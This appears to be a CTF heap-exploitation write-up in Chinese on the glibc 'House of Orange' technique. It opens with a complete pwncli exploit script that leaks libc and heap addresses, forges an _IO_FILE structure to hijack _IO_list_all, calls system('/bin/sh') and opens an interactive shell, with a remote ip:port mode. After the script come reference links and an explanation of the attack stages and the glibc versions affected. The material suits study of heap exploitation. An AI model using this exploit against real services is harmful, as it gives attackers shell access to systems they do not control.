
```py
#!/usr/bin/env python3
# Date: 2024-01-10 10:54:52
# Link: https://github.com/RoderickChan/pwncli
# Usage:
# Debug : python3 exp.py debug elf-file-path -t -b malloc
# Remote: python3 exp.py remote elf-file-path ip:port
from pwncli import *
cli_script()
io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc
one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
def cmd(i, prompt='Your choice :'):
    sla(prompt, i)
def add(nb,name,nb2,color):
    cmd('1')
    sla('Length of name :',str(nb))
    sa('Name',name)
    sla('Price of Orange:',str(nb2))
    sla('Color of Orange:',str(color))
#......
def show():
    cmd('2')
    ru('Name of house : ')
    return rl()[:-1]
#......
def edit(nb,name,nb2,color):
    cmd('3')
    sla('Length of name :',str(nb))
    sa('Name',name)
    sla('Price of Orange:',str(nb2))
    sla('Color of Orange:',str(color))
def dele():
    cmd('4')
#......
# i need a unsortedbin chunk
# i need libc leak
# 没有free，没法轻易释放chunk
# 但是有溢出，可以释放top chunk，拿到一个unsortedbin chunk
# 然后呢？伪造count所在chunk的hdr，导致合并，使用show触发UAR漏洞拿到libc leak的同时拿到 unsortedbin chunk！
# edit top size < 0x1000
size1 = 0x308
add(size1,'a',0x400,1)
edit(size1+0x28,flat({
size1:pack(0x21),
size1+0x20:pack(0x1000 - 0x20 -0x20 - (size1+0x8) + 1)
}),0x400,1)
# alloc a chunk size > top size
# trigger top grow
add(0x1000,'a',123,1)
add(0x500,'b'*8,123,4)
leak = show()[8:]
leak = unpack(leak,'all')
io_list_all = leak + 0x3b8
libc.address = leak-0x3c5168
success(f"leak => {hex(leak)}")
success(f"_IO_list_all => {hex(io_list_all)}")
# leak heap address
edit(0x500,'s'*16,123,2)
leak_heap = show()[16:]
leak_heap = unpack(leak_heap,'all')
heap_address = (leak_heap >> 12) << 12
success(f"heap leak => {hex(leak_heap)}")
success(f"heap base => {hex(heap_address)}")
success(f"libc base => {hex(libc.address)}")
# prepare a fake _IO_list_all
target = libc.sym.system # 【疑问】参数为什么是 chunk addr ？
payload = flat({
0x508:pack(0x21),
0x520:b'/bin/sh\x00',
0x528:pack(0x61),
0x530:pack(0) + pack(io_list_all-0x10),
0x540:pack(2) + pack(3),
0x5e0:pack(0),
0x520+0xd8:pack(heap_address + 0x9b8),
0x520+0xd8+0x18:pack(target)
},filler='\x00') # file.mode <= 0
edit(0x800,payload,12,2)
# trigger unsortedbin & exit
sl('1')
ia()
```

## 参考资料：

* [0] <a href="elink@5daK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5L8$3c8W2M7X3W2U0K9$3y4Z5j5h3&6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8Y4A6Z5i4K6u0V1j5$3&6Q4x3V1j5J5x3o6t1K6i4K6u0V1x3o6u0Q4x3X3b7J5y4#2)9J5k6r3S2G2N6i4y4W2i4K6u0V1L8$3k6Q4x3X3c8S2L8r3I4Q4x3X3c8S2j5X3!0#2N6q4)9J5k6r3N6D9K9h3u0U0i4K6u0V1K9r3g2S2M7q4)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5c8W2)9J5x3K6u0Q4x3X3c8Z5L8%4g2K6k6g2)9J5k6r3!0X3i4K6t1#2c8e0N6Q4x3U0g2n7x3#2)9J5y4f1u0n7i4K6t1#2c8e0g2Q4x3U0f1^5z5q4)9J5y4e0V1%4">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.github.io)</a>
* [1] <a href="elink@720K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1I4z5o6R3^5y4H3`.`.">House of orange-安全客 - 安全资讯平台 (anquanke.com)</a>
* [2] <a href="elink@557K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5H3P5o6b7K6y4r3u0Q4x3X3g2V1k6i4k6Q4x3V1k6G2N6X3g2J5N6X3W2W2N6#2)9J5k6r3!0X3i4K6u0V1k6$3I4A6j5X3y4Q4x3X3c8Z5k6h3q4H3i4K6u0V1k6i4S2H3L8r3!0A6N6r3q4@1K9h3!0F1i4K6u0V1N6r3g2U0K9r3&6A6M7i4g2W2M7#2)9J5c8W2)9J5x3%4g2F1M7$3!0J5N6r3g2V1j5X3W2F1i4K6u0V1j5i4c8@1j5h3y4C8">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a>
* [3] <a href="elink@f74K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9r3g2D9L8s2m8Z5K9i4y4Z5i4K6u0r3K9r3!0%4x3X3S2W2j5i4m8Q4x3V1k6T1L8r3!0T1i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3k6$3I4A6j5X3y4Q4y4h3j5J5i4K6u0W2x3U0y4Q4x3V1k6#2L8Y4y4G2M7Y4c8W2k6q4)9#2k6X3u0A6L8W2)9#2k6X3q4@1N6r3q4U0K9#2)9J5k6h3x3`.">how2heap/glibc_2.23/unsorted_bin_attack.c at master · shellphish/how2heap (github.com)</a>
* [4] <a href="elink@887K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2N6X3W2D9M7r3q4F1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9J5x3W2)9J5c8U0l9%4i4K6u0r3x3K6m8Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6r3g2^5M7q4)9J5k6s2c8J5K9h3y4C8M7#2)9J5c8R3`.`.">IO_FILE 与高版本 glibc 中的漏洞利用技巧 - evilpan</a>
* [5] <a href="elink@13dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8X3W2G2i4K6u0V1k6X3W2D9k6g2)9J5c8X3k6K6L8%4m8Q4x3V1j5`.">FSOP - CTF Wiki (ctf-wiki.org)</a>

## 简介

> 简介部分来自参考资料[0]，所有`malloc`流程性内容全部参考源码进行分析

### 漏洞成因

`overflow write`

### 适用范围

- `2.23`——`2.26`
- 没有 `free`
- 可以 `unsortedbin attack`

### 利用原理

`house of orange` 可以说是开启了堆与 `IO` 组合利用的先河，是非常经典、漂亮、精彩的利用组合技。利用过程还要结合 `top_chunk` 的性质，利用过程如下：

**stage1**

- 申请 `chunk A`，假设此时的 `top_chunk` 的 `size` 为 `0xWXYZ`
- 写 `A`，溢出修改 `top_chunk` 的 `size` 为 `0xXYZ`（需要满足页对齐的检测条件）
- 申请一个大于 `0xXYZ` 大小的 `chunk`，此时 `top_chunk` 会进行 `grow`，并将原来的 `old top_chunk` 释放进入 `unsortedbin`

**stage2**

- 溢出写 `A`，修改处于 `unsortedbin` 中的 `old top_chunk`，修改其 `size` 为 `0x61`，其 `bk` 为 `&_IO_list_all-0x10`，同时伪造好 `IO_FILE` 结构
- 申请非 `0x60` 大小的 `chunk` 的时候，首先触发 `unsortedbin attack`，将`_IO_list_all` 修改为 `main_arena+88`，然后 `unsortedbin chunk` 会进入到 `smallbin`，大小为 `0x60`；接着遍历 `unsortedbin` 的时候触发了 `malloc_printerr`，然后调用链为：`malloc_printerr -> libc_message -> abort -> _IO_flush_all_lockp`，调用到伪造的 `vtable` 里面的函数指针

### 相关技巧

- 在 `glibc-2.24` 后加入了 `vtable` 的 `check`，不能任意地址伪造 `vatble` 了，但是可以利用 `IO_str_jumps` 结构进行利用。
- 在 `glibc-2.26` 后，`malloc_printerr` 不再刷新 `IO` 流了，所以该方法失效
- 由于`_mode` 的正负性是随机的，影响判断条件，大概有 `1/2` 的概率会利用失败，多试几次就好

### 利用效果

- 任意函数执行
- 任意命令执行

## 实验：how2heap - house of orange

实验环境：libc 2.23

|  |  |
| --- | --- |
